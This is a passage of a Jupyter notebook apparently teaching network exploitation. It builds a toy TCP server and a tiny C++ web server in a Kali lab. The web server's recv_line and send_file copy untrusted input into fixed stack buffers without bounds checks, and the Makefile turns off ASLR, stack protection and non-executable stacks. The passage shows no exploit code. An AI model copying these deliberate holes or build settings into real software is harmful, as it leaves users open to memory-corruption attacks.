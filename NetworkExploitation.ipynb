{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Network Exploitation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## A Simple Server Example\n",
    "\n",
    "- a server that listens for TCP connection on port 7890\n",
    "- when a client connects it sends a message *Hello there!* and receives data until connection is closed\n",
    "- see demos/simple_server/ folder \n",
    "    - main.cpp and utility.h are the two files required to build the simple server\n",
    "    - use the provided Makefile to build and run the executable\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/NetworkSecurity'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# check the working directory\n",
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00-TableOfContents.ipynb   nmapResults.txt\r\n",
      "arp-spoofing.png\t   nmapResults.xml\r\n",
      "demos\t\t\t   port_bind_exploit.bin\r\n",
      "graph.svg\t\t   port_bind_shellcode.bin\r\n",
      "hosts.txt\t\t   README.md\r\n",
      "icmp.pcap\t\t   resources\r\n",
      "junk.txt\t\t   ScapyIntro.ipynb\r\n",
      "labs\t\t\t   ScapyScripts.ipynb\r\n",
      "LICENSE\t\t\t   ScapySendReceivePackets.ipynb\r\n",
      "local_exploit.bin\t   shellcode\r\n",
      "NetworkExploitation.ipynb  SniffingWithScapy.ipynb\r\n",
      "Networking.ipynb\t   tracegraph.svg\r\n",
      "NetworkSniffing.ipynb\t   Traceroute-BashVsScapy.ipynb\r\n",
      "NetworkUtility.ipynb\t   washington.html\r\n"
     ]
    }
   ],
   "source": [
    "# list files and folders from current working directory\n",
    "! ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/NetworkSecurity/demos/simple_server\n"
     ]
    }
   ],
   "source": [
    "# change working directory to demos/simple_server\n",
    "%cd demos/simple_server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 176\r\n",
      "drwxr-xr-x 2 kali kali  4096 Jul 20 14:00 .\r\n",
      "drwxr-xr-x 5 kali kali  4096 Jun 23 12:41 ..\r\n",
      "-rw-r--r-- 1 kali kali  2019 Jun 22 17:04 main.cpp\r\n",
      "-rw-r--r-- 1 kali kali 84364 Jul 20 14:00 main.o\r\n",
      "-rw-r--r-- 1 kali kali   797 Jun 22 15:54 Makefile\r\n",
      "-rwxr-xr-x 1 kali kali 77768 Jul 20 14:00 simple_server.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <unistd.h>\r\n",
      "#include <sys/socket.h>\r\n",
      "#include <netinet/in.h>\r\n",
      "#include <arpa/inet.h>\r\n",
      "#include <iostream>\r\n",
      "#include \"../util/utility.h\"\r\n",
      "\r\n",
      "#define PORT 7890\t// the port users will be connecting to\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "\tint sockfd, new_sockfd;  // listen on sock_fd, new connection on new_fd\r\n",
      "\tstruct sockaddr_in host_addr, client_addr;\t// my address information\r\n",
      "\tsocklen_t sin_size;\r\n",
      "\tint recv_length=1, yes=1;\r\n",
      "\tchar buffer[1024];\r\n",
      "\r\n",
      "\tif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\r\n",
      "\t\tfatal(\"in socket\");\r\n",
      "\r\n",
      "\tif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\r\n",
      "\t\tfatal(\"setting socket option SO_REUSEADDR\");\r\n",
      "\t\r\n",
      "\thost_addr.sin_family = AF_INET;\t\t // host byte order\r\n",
      "\thost_addr.sin_port = htons(PORT);\t // short, network byte order\r\n",
      "\thost_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\r\n",
      "\tmemset(&(host_addr.sin_zero), '\\0', 8); // zero the rest of the struct\r\n",
      "\r\n",
      "\tif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\r\n",
      "\t\tfatal(\"binding to socket\");\r\n",
      "\r\n",
      "\tif (listen(sockfd, 5) == -1)\r\n",
      "\t\tfatal(\"listening on socket\");\r\n",
      "\r\n",
      "\twhile(1) {    // Accept loop\r\n",
      "        printf(\"Server running on: %s:%d\\n\", inet_ntoa(host_addr.sin_addr), ntohs(host_addr.sin_port));\r\n",
      "\t\tsin_size = sizeof(struct sockaddr_in);\r\n",
      "\t\tnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\r\n",
      "\t\tif(new_sockfd == -1)\r\n",
      "\t\t\tfatal(\"accepting connection\");\r\n",
      "\t\tprintf(\"server: got connection from %s port %d\\n\",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));\r\n",
      "\t\t\r\n",
      "        // send Hello there... to client\r\n",
      "        send(new_sockfd, \"Hello there!\\n\", 13, 0);\r\n",
      "\t\t\r\n",
      "        // receive upto 1024 bytes and store into buffer\r\n",
      "        recv_length = recv(new_sockfd, &buffer, 1024, 0);\r\n",
      "\t\twhile(recv_length > 0) {\r\n",
      "\t\t\tprintf(\"RECV: %d bytes\\n\", recv_length);\r\n",
      "\t\t\tdump(buffer, recv_length);\r\n",
      "            // receive 1024 bytes\r\n",
      "\t\t\trecv_length = recv(new_sockfd, &buffer, 1024, 0);\r\n",
      "\t\t}\r\n",
      "\t\tclose(new_sockfd);\r\n",
      "\t}\r\n",
      "\treturn 0;\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat main.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cat: utility.h: No such file or directory\r\n"
     ]
    }
   ],
   "source": [
    "! cat utility.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "# rule for compiling program\r\n",
      "\r\n",
      "COMPILER = g++\r\n",
      "COMPILER_FLAGS = -c -g -Wall -std=c++17 -m32\r\n",
      "BUILD_FLAGS = -m32 -fno-stack-protector -z execstack -no-pie\r\n",
      "\r\n",
      "# list .cpp files separated by space\r\n",
      "CPP_FILES = main.cpp\r\n",
      "\r\n",
      "# executable program name\r\n",
      "PROGRAM_NAME = simple_server.exe\r\n",
      "\r\n",
      "# rule for compiling and building program\r\n",
      "# make or make all triggers the following rule\r\n",
      "build:\r\n",
      "\t# disable ASLR\r\n",
      "\techo 0 | sudo tee /proc/sys/kernel/randomize_va_space\r\n",
      "\t# compiles .cpp to object file .o\r\n",
      "\t$(COMPILER) $(COMPILER_FLAGS) $(CPP_FILES)\r\n",
      "\t# builds executable from object files\r\n",
      "\t$(COMPILER) $(BUILD_FLAGS) -o $(PROGRAM_NAME) *.o\r\n",
      "\r\n",
      "# rule for running programming\r\n",
      "# make run triggers the following rule\r\n",
      "run:\r\n",
      "\t./$(PROGRAM_NAME)\r\n",
      "\r\n",
      "# rule for clean up\r\n",
      "# make clean triggers the following rule\r\n",
      "clean:\r\n",
      "\trm -f $(PROGRAM_NAME) *.o"
     ]
    }
   ],
   "source": [
    "! cat Makefile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "# disable ASLR\n",
      "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\n",
      "0\n",
      "# compiles .cpp to object file .o\n",
      "g++ -c -g -Wall -std=c++17 -m32 main.cpp\n",
      "# builds executable from object files\n",
      "g++ -m32 -fno-stack-protector -z execstack -no-pie -o simple_server.exe *.o\n"
     ]
    }
   ],
   "source": [
    "# compile and build the executable\n",
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run  ./simple_server.exe from a terminal\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/simple_server]\n",
    "└─$ make run                                                                 \n",
    "./simple_server.exe\n",
    "Server running on: 0.0.0.0:7890\n",
    "```\n",
    "\n",
    "- notice the log as clients connect to it\n",
    "\n",
    "### install telnet client if not found"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "telnet: invalid option -- '-'\r\n",
      "Usage: telnet [-4] [-6] [-8] [-E] [-L] [-a] [-d] [-e char] [-l user]\r\n",
      "\t[-n tracefile] [ -b addr ] [-r] [host-name [port]]\r\n"
     ]
    }
   ],
   "source": [
    "! telnet --help"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Reading package lists... Done\n",
      "Building dependency tree... Done\n",
      "Reading state information... Done\n",
      "telnet is already the newest version (0.17-42).\n",
      "0 upgraded, 0 newly installed, 0 to remove and 65 not upgraded.\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S apt install telnet"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### run telnet client from another terminal\n",
    "- interact with the server by sending some data on telnet prompt\n",
    "```bash\n",
    "telnet server_ip port\n",
    "```\n",
    "- telnet is line-buffered, hit enter to send data\n",
    "    - e.g., hi from cleint...[enter]\n",
    "- when done enter `ctrl ]` to close connection on telnet client prompt >\n",
    "- enter quit command to quit the telnet client\n",
    "```\n",
    "telnet>quit\n",
    "```\n",
    "\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ telnet 127.0.0.1 7890 \n",
    "Trying 127.0.0.1...\n",
    "Connected to 127.0.0.1.\n",
    "Escape character is '^]'.\n",
    "Hello there!\n",
    "hi from client...\n",
    "```\n",
    "\n",
    "### simple_server log as the client sends data\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity/demos/simple_server]\n",
    "└─$ make run                                                                 \n",
    "./simple_server.exe\n",
    "Server running on: 0.0.0.0:7890\n",
    "server: got connection from 127.0.0.1 port 38656\n",
    "RECV: 19 bytes\n",
    "68 69 20 66 72 6f 6d 20 63 6c 69 65 6e 74 2e 2e | hi from client..\n",
    "2e 0d 0a                                        | ...\n",
    "```\n",
    "\n",
    "\n",
    "### run telnet from a remote system\n",
    "- interact with the server by sending some data on telnet prompt\n",
    "- tlenet is line-buffered, hit enter to send data\n",
    "- when done enter ctrl+] get the client prompt >\n",
    "- enter quit to exit the telnet\n",
    "\n",
    "```bash\n",
    "    telnet <server ip> 7890\n",
    "    this is a test from a remote system...\n",
    "    here's some more data...\n",
    "    do you read this from another system?\n",
    "    ctrl+]\n",
    "```\n",
    "\n",
    "### check simple_serve log on the terminal\n",
    "- notice `\\x0D` and `\\x0A` at the end of every data sent\n",
    "- telnet and HTTP protocols expect lines/data to be terminted with these two bytes\n",
    "    - carriage return and new line feed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "       Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char\r\n",
      "       012   10    0A    LF  '\\n' (new line)         112   74    4A    J\r\n",
      "       015   13    0D    CR  '\\r' (carriage ret)     115   77    4D    M\r\n"
     ]
    }
   ],
   "source": [
    "# lets check the ASCII table\n",
    "! man ascii | egrep \"Hex|0A|0D\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### telnet to a webserver\n",
    "- open a terminal\n",
    "- issue HEAD / HTTP/1.0 command and enter twice\n",
    "\n",
    "```bash \n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ telnet example.com 80                                                                                \n",
    "Trying 93.184.216.34...\n",
    "Connected to example.com.\n",
    "Escape character is '^]'.\n",
    "HEAD /index.html HTTP/1.0 <--- HTTP HEAD Request\n",
    "[enter][enter]\n",
    "\n",
    "HTTP/1.0 200 OK\n",
    "Accept-Ranges: bytes\n",
    "Content-Type: text/html\n",
    "Date: Tue, 22 Jun 2021 22:49:43 GMT\n",
    "Last-Modified: Tue, 22 Jun 2021 22:44:04 GMT\n",
    "Server: ECS (dna/63B1)\n",
    "Content-Length: 94\n",
    "Connection: close\n",
    "\n",
    "Connection closed by foreign host.\n",
    "```\n",
    "\n",
    "- issue GET request\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ telnet example.com 80                                                                                \n",
    "Trying 93.184.216.34...\n",
    "Connected to example.com.\n",
    "Escape character is '^]'.\n",
    "GET /index.html HTTP/1.0\n",
    "\n",
    "HTTP/1.0 200 OK\n",
    "Accept-Ranges: bytes\n",
    "Content-Type: text/html\n",
    "Date: Tue, 22 Jun 2021 22:51:39 GMT\n",
    "Last-Modified: Tue, 22 Jun 2021 22:44:04 GMT\n",
    "Server: ECS (dna/63B1)\n",
    "Content-Length: 94\n",
    "Connection: close\n",
    "\n",
    "<html><head><title>edgecastcdn.net</title></head><body><h1>edgecastcdn.net</h1></body></html>\n",
    "Connection closed by foreign host.\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## A Tiny Web Server\n",
    "- similar to simple server but uses HTTP protocol to communicate\n",
    "- handles HTTP GET and HEAD requests\n",
    "- looks for the requested resource in the local directory callled `webroot` and sends it to the client/browser\n",
    "- if the file/resource is not found, the server responds with 404 HTTP (`File Not Found`) error in response\n",
    "- the demo web server is found in `demos/tinyweb/` folder\n",
    "- use the provided Makefile to compile and build the Tinyweb server\n",
    "\n",
    "```bash\n",
    "$ cd <tinyweb_folder>\n",
    "$ make\n",
    "$ make run\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/NetworkSecurity/demos/simple_server'"
      ]
     },
     "execution_count": 12,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# check the current working directory\n",
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/NetworkSecurity/demos/tinyweb\n"
     ]
    }
   ],
   "source": [
    "%cd ../tinyweb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <fcntl.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <unistd.h>\r\n",
      "#include <sys/stat.h>\r\n",
      "#include <sys/socket.h>\r\n",
      "#include <netinet/in.h>\r\n",
      "#include <arpa/inet.h>\r\n",
      "#include \"../util/utility.h\"\r\n",
      "#include \"../util/net_utility.h\"\r\n",
      "\r\n",
      "enum REQUEST_TYPE {GET, POST, HEAD, UNKNOWN};\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "#define PORT 80   // the port users will be connecting to\r\n",
      "#define WEBROOT \"./webroot\" // the web server's root directory\r\n",
      "\r\n",
      "void handle_connection(int, struct sockaddr_in *); // handle web requests\r\n",
      "int get_file_size(int); // returns the filesize of open file descriptor\r\n",
      "void send_file_not_found(const int); // send file not found error\r\n",
      "void send_file(const int, char *); // send file/resource requested\r\n",
      "\r\n",
      "int main(void) {\r\n",
      "   int sockfd, new_sockfd, yes=1; \r\n",
      "   struct sockaddr_in host_addr, client_addr;   // my address information\r\n",
      "   socklen_t sin_size;\r\n",
      "\r\n",
      "   printf(\"Accepting web requests on port %d\\n\", PORT);\r\n",
      "\r\n",
      "   if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\r\n",
      "      fatal(\"in socket\");\r\n",
      "\r\n",
      "   if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\r\n",
      "      fatal(\"setting socket option SO_REUSEADDR\");\r\n",
      "\r\n",
      "   host_addr.sin_family = AF_INET;      // host byte order\r\n",
      "   host_addr.sin_port = htons(PORT);    // short, network byte order\r\n",
      "   host_addr.sin_addr.s_addr = INADDR_ANY; // automatically fill with my IP\r\n",
      "   memset(&(host_addr.sin_zero), '\\0', 8); // zero the rest of the struct\r\n",
      "\r\n",
      "   if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\r\n",
      "      fatal(\"binding to socket\");\r\n",
      "\r\n",
      "   if (listen(sockfd, 20) == -1)\r\n",
      "      fatal(\"listening on socket\");\r\n",
      "\r\n",
      "   while(1) {   // Accept loop\r\n",
      "      sin_size = sizeof(struct sockaddr_in);\r\n",
      "      new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\r\n",
      "      if(new_sockfd == -1)\r\n",
      "         fatal(\"accepting connection\");\r\n",
      "\r\n",
      "      handle_connection(new_sockfd, &client_addr);\r\n",
      "   }\r\n",
      "   return 0;\r\n",
      "}\r\n",
      "\r\n",
      "/* This function handles the connection on the passed socket from the\r\n",
      " * passed client address.  The connection is processed as a web request\r\n",
      " * and this function replies over the connected socket.  Finally, the \r\n",
      " * passed socket is closed at the end of the function.\r\n",
      " */\r\n",
      "void handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\r\n",
      "\tchar *ptr, request[500];\r\n",
      "\tint length = 0;\r\n",
      "\tREQUEST_TYPE req_type = UNKNOWN;\r\n",
      "\r\n",
      "\t// receive one line from client and store it into request buffer\r\n",
      "\tlength = recv_line(sockfd, request);\r\n",
      "\r\n",
      "\tprintf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);\r\n",
      "\tprintf(\"Received: %d bytes\\n\", length);\r\n",
      "\r\n",
      "\tptr = strstr(request, \" HTTP/\"); // search for valid looking request\r\n",
      "\tif(ptr == NULL) { // then this isn't valid HTTP\r\n",
      "\t\tprintf(\" NOT HTTP!\\n\");\r\n",
      "\t} \r\n",
      "\telse {\r\n",
      "\t\t*ptr = 0; // terminate the buffer at the end of the URL\r\n",
      "\t\tptr = NULL; // set ptr to NULL (used to flag for an invalid request)\r\n",
      "\t\tif(strncmp(request, \"GET \", 4) == 0) {  // get request\r\n",
      "\t\t\tptr = request+4; // ptr is the URL\r\n",
      "\t\t\treq_type = GET;\r\n",
      "\t\t}\r\n",
      "\t\tif(strncmp(request, \"HEAD \", 5) == 0) { // head request\r\n",
      "\t\t \tptr = request+5; // ptr is the URL\r\n",
      "\t\t \treq_type = HEAD;\r\n",
      "\t\t}\r\n",
      "\r\n",
      "\t\tif(req_type == UNKNOWN) { // then this is not a recognized request\r\n",
      "\t\t\tprintf(\"\\tUNKNOWN REQUEST!\\n\");\r\n",
      "\t\t} \r\n",
      "\t\telse if (req_type == GET) { // valid request, with ptr pointing to the resource name\r\n",
      "\t\t\tsend_file(sockfd, ptr);\r\n",
      "\t    }\r\n",
      "   } // end if block for valid HTTP\r\n",
      "   shutdown(sockfd, SHUT_RDWR); // close the socket gracefully\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts an open file descriptor and returns     \r\n",
      " * the size of the associated file.  Returns -1 on failure.\r\n",
      " */\r\n",
      "int get_file_size(int fd) {\r\n",
      "\tstruct stat stat_struct;\r\n",
      "\r\n",
      "\tif(fstat(fd, &stat_struct) == -1)\r\n",
      "\t\treturn -1;\r\n",
      "\treturn (int) stat_struct.st_size;\r\n",
      "}\r\n",
      "\r\n",
      "void send_file_not_found(const int sockfd) {\r\n",
      "\tprintf(\" 404 Not Found\\n\");\r\n",
      "\tsend_string(sockfd, \"HTTP/1.0 404 NOT FOUND\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "\tsend_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\r\n",
      "\tsend_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\r\n",
      "}\r\n",
      "\r\n",
      "void send_file(const int sockfd, char *ptr) {\r\n",
      "\t// handle GET request\r\n",
      "\tchar resource[500];\r\n",
      "\tint fd, length;\r\n",
      "\r\n",
      "\tif (ptr[strlen(ptr) - 1] == '/')  // for resources ending with '/'\r\n",
      "\t\tstrcat(ptr, \"index.html\");     // add 'index.html' to the end\r\n",
      "\tstrcpy(resource, WEBROOT);     // begin resource with web root path\r\n",
      "\tstrcat(resource, ptr);         //  and append resource path\r\n",
      "\r\n",
      "\tfd = open(resource, O_RDONLY, 0); // try to open the file\r\n",
      "\tprintf(\"\\tOpening \\'%s\\'\\t\", resource);\r\n",
      "\r\n",
      "\tif(fd == -1) { // if file is not found\r\n",
      "\t\tsend_file_not_found(sockfd);\r\n",
      "\t} \r\n",
      "\telse {      // otherwise, serve up the file\r\n",
      "\t\tprintf(\" 200 OK\\n\");\r\n",
      "\t\tsend_string(sockfd, \"HTTP/1.0 200 OK\\r\\n\");\r\n",
      "\t\tsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\r\n",
      "\t\t\r\n",
      "\t\tif( (length = get_file_size(fd)) == -1)\r\n",
      "\t\t\tfatal(\"getting resource file size\");\r\n",
      "\r\n",
      "\t\tptr = (char *) malloc(length);\r\n",
      "\t\tif(ptr == NULL)\r\n",
      "\t\t\tfatal(\"allocating memory for reading resource\");\r\n",
      "\r\n",
      "\t\tread(fd, ptr, length); // read the file into memory\r\n",
      "\t\tsend(sockfd, ptr, length, 0);  // send it to socket\r\n",
      "\t\tfree(ptr); // free file memory\r\n",
      "\t\tclose(fd); // close the file\r\n",
      "\t} // end if block for file found/not found\r\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat main.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\r\n",
      "\t<head><title>A sample webpage</title>\r\n",
      "\t</head>\r\n",
      "\t<body bgcolor=\"#000000\" text=\"#ffffffff\">\r\n",
      "\t\t<center>\r\n",
      "\t\t\t<h1>Home<h1>\r\n",
      "\r\n",
      "\t\t\t<h3>This is a sample webpage....</h3>\r\n",
      "\r\n",
      "\t\t\t<p>...and this is a paragraph</p>\r\n",
      "\r\n",
      "\t\t\t<p>\r\n",
      "\t\t\t\tA simple link to <a href=\"http://example.com\" target=\"__blank\">Example.com</a>\r\n",
      "\t\t\t</p>\r\n",
      "\r\n",
      "\t\t\t<p>...and even a sample image:</p>\r\n",
      "\t\t\t<img src=\"image.jpg\"><br>\r\n",
      "\t\t</center>\r\n",
      "\t</body>\r\n",
      "</html>\r\n"
     ]
    }
   ],
   "source": [
    "! cat webroot/index.html"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "/* This function accepts a socket FD and a ptr to the null terminated\r\n",
      " * string to send.  The function will make sure all the bytes of the\r\n",
      " * string are sent.  Returns 1 on success and 0 on failure.\r\n",
      " */\r\n",
      "int send_string(int sockfd, string buffer) {\r\n",
      "   int sent_bytes, bytes_to_send;\r\n",
      "   bytes_to_send = buffer.length();\r\n",
      "   while(bytes_to_send > 0) {\r\n",
      "      sent_bytes = send(sockfd, buffer.c_str(), bytes_to_send, 0);\r\n",
      "      if(sent_bytes == -1)\r\n",
      "         return 0; // return 0 on send error\r\n",
      "      bytes_to_send -= sent_bytes;\r\n",
      "      buffer += sent_bytes;\r\n",
      "   }\r\n",
      "   return 1; // return 1 on success\r\n",
      "}\r\n",
      "\r\n",
      "/* This function accepts a socket FD and a ptr to a destination\r\n",
      " * buffer.  It will receive from the socket until the EOL byte\r\n",
      " * sequence in seen.  The EOL bytes are read from the socket, but\r\n",
      " * the destination buffer is terminated before these bytes.\r\n",
      " * Returns the size of the read line (without EOL bytes).\r\n",
      " */\r\n",
      "int recv_line(int sockfd, char *dest_buffer) {\r\n",
      "#define EOL \"\\r\\n\" // End-Of-Line byte sequence\r\n",
      "#define EOL_SIZE 2\r\n",
      "   char *ptr;\r\n",
      "   int eol_matched = 0;\r\n",
      "\r\n",
      "   ptr = dest_buffer;\r\n",
      "   while(recv(sockfd, ptr, 1, 0) == 1) { // read a single byte\r\n",
      "      if(*ptr == EOL[eol_matched]) { // does this byte match terminator\r\n",
      "         eol_matched++;\r\n",
      "         if(eol_matched == EOL_SIZE) { // if all bytes match terminator,\r\n",
      "            *(ptr+1-EOL_SIZE) = '\\0'; // terminate the string\r\n",
      "            return strlen(dest_buffer); // return bytes recevied\r\n",
      "         }\r\n",
      "      } else {\r\n",
      "         eol_matched = 0;\r\n",
      "      }   \r\n",
      "      ptr++; // increment the pointer to the next byter;\r\n",
      "   }\r\n",
      "   return 0; // didn't find the end of line characters\r\n",
      "}\r\n",
      "\r\n",
      "\r\n",
      "/* Structure for Ethernet headers */\r\n",
      "#define ETHER_ADDR_LEN 6\r\n",
      "#define ETHER_HDR_LEN 14\r\n",
      "\r\n",
      "struct ether_hdr {\r\n",
      "   unsigned char ether_dest_addr[ETHER_ADDR_LEN]; // Destination MAC address\r\n",
      "   unsigned char ether_src_addr[ETHER_ADDR_LEN];  // Source MAC address\r\n",
      "   unsigned short ether_type; // Type of Ethernet packet\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Internet Protocol (IP) headers */\r\n",
      "struct ip_hdr {\r\n",
      "   unsigned char ip_version_and_header_length; // version and header length combined\r\n",
      "   unsigned char ip_tos;          // type of service\r\n",
      "   unsigned short ip_len;         // total length\r\n",
      "   unsigned short ip_id;          // identification number\r\n",
      "   unsigned short ip_frag_offset; // fragment offset and flags\r\n",
      "   unsigned char ip_ttl;          // time to live\r\n",
      "   unsigned char ip_type;         // protocol type\r\n",
      "   unsigned short ip_checksum;    // checksum\r\n",
      "   unsigned int ip_src_addr;      // source IP address\r\n",
      "   unsigned int ip_dest_addr;     // destination IP address\r\n",
      "};\r\n",
      "\r\n",
      "/* Structure for Transmission Control Protocol (TCP) headers */\r\n",
      "struct tcp_hdr {\r\n",
      "   unsigned short tcp_src_port;   // source TCP port\r\n",
      "   unsigned short tcp_dest_port;  // destination TCP port\r\n",
      "   unsigned int tcp_seq;          // TCP sequence number\r\n",
      "   unsigned int tcp_ack;          // TCP acknowledgement number\r\n",
      "   unsigned char reserved:4;      // 4-bits from the 6-bits of reserved space\r\n",
      "   unsigned char tcp_offset:4;    // TCP data offset for little endian host\r\n",
      "   unsigned char tcp_flags;       // TCP flags (and 2-bits from reserved space)\r\n",
      "#define TCP_FIN   0x01\r\n",
      "#define TCP_SYN   0x02\r\n",
      "#define TCP_RST   0x04\r\n",
      "#define TCP_PUSH  0x08\r\n",
      "#define TCP_ACK   0x10\r\n",
      "#define TCP_URG   0x20\r\n",
      "   unsigned short tcp_window;     // TCP window size\r\n",
      "   unsigned short tcp_checksum;   // TCP checksum\r\n",
      "   unsigned short tcp_urgent;     // TCP urgent pointer\r\n",
      "};\r\n"
     ]
    }
   ],
   "source": [
    "! cat ../util/net_utility.h"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "// A function to display an error message and then exit\r\n",
      "void fatal(string message) {\r\n",
      "   char error_message[100];\r\n",
      "\r\n",
      "   strcpy(error_message, \"[!!] Fatal Error \");\r\n",
      "   strncat(error_message, message.c_str(), 83);\r\n",
      "   perror(error_message);\r\n",
      "   exit(-1);\r\n",
      "}\r\n",
      "\r\n",
      "// An error checked malloc() wrapper function\r\n",
      "void *ec_malloc(unsigned int size) {\r\n",
      "   void *ptr;\r\n",
      "   ptr = malloc(size);\r\n",
      "   if(ptr == NULL)\r\n",
      "      fatal(\"in ec_malloc() on memory allocation\");\r\n",
      "   return ptr;\r\n",
      "}\r\n",
      "\r\n",
      "// dumps raw memory in hex byte and printable split format\r\n",
      "void dump(char *data_buffer, const unsigned int length) {\r\n",
      "\tunsigned char byte;\r\n",
      "\tunsigned int i, j;\r\n",
      "\tfor(i=0; i < length; i++) {\r\n",
      "\t\tbyte = data_buffer[i];\r\n",
      "\t\tprintf(\"%02x \", data_buffer[i]);  // display byte in hex\r\n",
      "\t\tif(((i%16)==15) || (i==length-1)) {\r\n",
      "\t\t\tfor(j=0; j < 15-(i%16); j++)\r\n",
      "\t\t\t\tprintf(\"   \");\r\n",
      "\t\t\tprintf(\"| \");\r\n",
      "\t\t\tfor(j=(i-(i%16)); j <= i; j++) {  // display printable bytes from line\r\n",
